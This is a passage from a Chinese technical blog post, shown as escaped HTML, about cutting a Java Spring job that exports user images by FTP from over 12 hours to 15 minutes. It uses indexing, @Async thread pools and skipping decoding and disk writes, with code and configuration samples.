tableName);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   map.put(&amp;quot;status&amp;quot;, 1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   List&amp;lt;UserInfo&amp;gt; userInfoList = userDao.getUserInfoImg(map);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   if (userInfoList == null || userInfoList.size() == 0) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   for (int j = 0; j &amp;lt; userInfoList.size(); j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    UserInfo user = userInfoList.get(j);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    String userId = user.getUserId();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    String userName = user.getUserName();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    byte[] content = user.getImgContent;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // 下载图片到本地&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FileUtil.dowmloadImage(imgDir + userId+&amp;quot;-&amp;quot;+userName+&amp;quot;.png&amp;quot;, content);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // 将下载好的图片，通过FTP上传给第三方&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FileUtil.uploadByFtp(imgDir);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  serviceLogger.error(&amp;quot;获取图片异常：&amp;quot;, e);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;二、谁写的？赶紧加班优化，会追责吗？&#34;&gt;&lt;a href=&#34;#二、谁写的？赶紧加班优化，会追责吗？&#34; class=&#34;headerlink&#34; title=&#34;二、谁写的？赶紧加班优化，会追责吗？&#34;&gt;&lt;/a&gt;二、谁写的？赶紧加班优化，会追责吗？&lt;/h4&gt;&lt;p&gt;经过1小时的深思熟虑，慢的原因可能有以下几点：&lt;/p&gt;
&lt;p&gt;1.查询数据库&lt;/p&gt;
&lt;p&gt;2.程序串行&lt;/p&gt;
&lt;p&gt;3.base64解密&lt;/p&gt;
&lt;p&gt;4.图片落地&lt;/p&gt;
&lt;p&gt;5.FTP上传到服务器&lt;/p&gt;
&lt;p&gt;优化1：数据库中添加对应的索引，提高查询速度&lt;/p&gt;
&lt;p&gt;优化2：采用增加索引+异步+多线程的方式进行导出&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/202405101.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;优化3：不解密+图片不落地，直接通过FTP传给第三方&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/202405102.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用索引+异步+不解密+不落地 后，40G图片的导出上传，从12+小时 优化到15 分钟，你敢信？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;差不多的代码，效率差距竟如此之大。&lt;/p&gt;
&lt;p&gt;下面贴出导出图片不落地的关键代码。&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@Resource&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private UserAsyncService userAsyncService;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public void getUserInfoImg() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  // 获取需要导出的月表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  String[] monthArr = months.split(&amp;quot;,&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  for (int i = 0; i &amp;lt; monthArr.length; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   userAsyncService.getUserInfoImgAsync(monthArr[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  serviceLogger.error(&amp;quot;获取图片异常：&amp;quot;, e);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@Value(&amp;quot;$&amp;#123;months&amp;#125;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private String months;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@Resource&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private UserDao userDao;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@Async(&amp;quot;async-executor&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public void getUserInfoImgAsync(String month) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  // 获取月表中的图片&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Map&amp;lt;String, Object&amp;gt; map = new HashMap&amp;lt;String, Object&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  String tableName = &amp;quot;USER_INFO_&amp;quot; + month;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  map.put(&amp;quot;tableName&amp;quot;, tableName);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  map.put(&amp;quot;status&amp;quot;, 1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  List&amp;lt;UserInfo&amp;gt; userInfoList = userDao.getUserInfoImg(map);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if (userInfoList == null || userInfoList.size() == 0) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  for (int i = 0; i &amp;lt; userInfoList.size(); i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   UserInfo user = userInfoList.get(i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   String userId = user.getUserId();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   String userName = user.getUserName();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   byte[] content = user.getImgContent;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   // 不落地，直接通过FTP上传给第三方&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   FileUtil.uploadByFtp(content);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  serviceLogger.error(&amp;quot;获取图片异常：&amp;quot;, e);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;4、异步线程池工具类&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;@Async的作用就是异步处理任务。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.在方法上添加@Async，表示此方法是异步方法；&lt;/p&gt;
&lt;p&gt;2.在类上添加@Async，表示类中的所有方法都是异步方法；&lt;/p&gt;
&lt;p&gt;3.使用此注解的类，必须是Spring管理的类；&lt;/p&gt;
&lt;p&gt;4.需要在启动类或配置类中加入@EnableAsync注解，@Async才会生效；&lt;/p&gt;
&lt;p&gt;在使用@Async时，如果不指定线程池的名称，也就是不自定义线程池，@Async是有默认线程池的，使用的是Spring默认的线程池SimpleAsyncTaskExecutor。&lt;/p&gt;
&lt;p&gt;默认线程池的默认配置如下：&lt;/p&gt;
&lt;p&gt;1.默认核心线程数：8；&lt;/p&gt;
&lt;p&gt;2.最大线程数：Integet.MAX_VALUE；&lt;/p&gt;
&lt;p&gt;3.队列使用LinkedBlockingQueue；&lt;/p&gt;
&lt;p&gt;4.容量是：Integet.MAX_VALUE；&lt;/p&gt;
&lt;p&gt;5.空闲线程保留时间：60s；&lt;/p&gt;
&lt;p&gt;6.线程池拒绝策略：AbortPolicy；&lt;/p&gt;
&lt;p&gt;从最大线程数可以看出，在并发情况下，会无限制的创建线程，我勒个吗啊。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;也可以通过yml重新配置：&lt;/strong&gt;&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;spring:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  task:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    execution:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      pool:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        max-size: 10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        core-size: 5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        keep-alive: 3s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        queue-capacity: 1000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        thread-name-prefix: my-executor&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也可以自定义线程池，下面通过简单的代码来实现以下@Async自定义线程池。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@EnableAsync// 支持异步操作&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@Configuration&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class AsyncTaskConfig &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     * com.google.guava中的线程池&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     * @return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @Bean(&amp;quot;my-executor&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public Executor firstExecutor() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ThreadFactory threadFactory = new ThreadFactoryBuilder().setNameFormat(&amp;quot;my-executor&amp;quot;).build();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 获取CPU的处理器数量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int curSystemThreads = Runtime.getRuntime().availableProcessors() * 2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ThreadPoolExecutor threadPool = new ThreadPoolExecutor(curSystemThreads, 100,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                200, TimeUnit.SECONDS,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                new LinkedBlockingQueue&amp;lt;&amp;gt;(), threadFactory);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        threadPool.allowsCoreThreadTimeOut();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return threadPool;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     * Spring线程池&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     * @return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @Bean(&amp;quot;async-executor&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public Executor asyncExecutor() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ThreadPoolTaskExecutor taskExecutor = new ThreadPoolTaskExecutor();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 核心线程数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        taskExecutor.setCorePoolSize(24);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 线程池维护线程的最大数量，只有在缓冲队列满了之后才会申请超过核心线程数的线程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        taskExecutor.setMaxPoolSize(200);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 缓存队列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        taskExecutor.setQueueCapacity(50);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 空闲时间，当超过了核心线程数之外的线程在空闲时间到达之后会被销毁&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        taskExecutor.setKeepAliveSeconds(200);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 异步方法内部线程名称&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        taskExecutor.setThreadNamePrefix(&amp;quot;async-executor-&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        /**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         * 当线程池的任务缓存队列已满并且线程池中的线程数目达到maximumPoolSize，如果还有任务到来就会采取任务拒绝策略&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         * 通常有以下四种策略：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         * ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         * ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         * ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         * ThreadPoolExecutor.CallerRunsPolicy：重试添加当前的任务，自动重复调用 execute() 方法，直到成功&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        taskExecutor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        taskExecutor.initialize();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return taskExecutor;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;三、告别劣质代码，优化从何入手？&#34;&gt;&lt;a href=&#34;#三、告别劣质代码，优化从何入手？&#34; class=&#34;headerlink&#34; title=&#34;三、告别劣质代码，优化从何入手？&#34;&gt;&lt;/a&gt;三、告别劣质代码，优化从何入手？&lt;/h4&gt;&lt;p&gt;我觉得优化有两个大方向：&lt;/p&gt;
&lt;p&gt;1.业务优化&lt;/p&gt;
&lt;p&gt;2.代码优化&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、业务优化业&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;务优化的影响力非常大，但它一般属于产品和项目经理的范畴，CRUD程序员很少能接触到。&lt;/p&gt;
&lt;p&gt;比如上面说的图片导出上传需求，经过产品经理和项目经理的不懈努力，这个需求不做了，这优化力度，史无前例啊。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、代码优化&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.数据库优化&lt;/p&gt;
&lt;p&gt;2.复用优化&lt;/p&gt;
&lt;p&gt;3.并行优化&lt;/p&gt;
&lt;p&gt;4.算法优化&lt;br&gt;&lt;img src=&#34;/img/2024/202405103.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
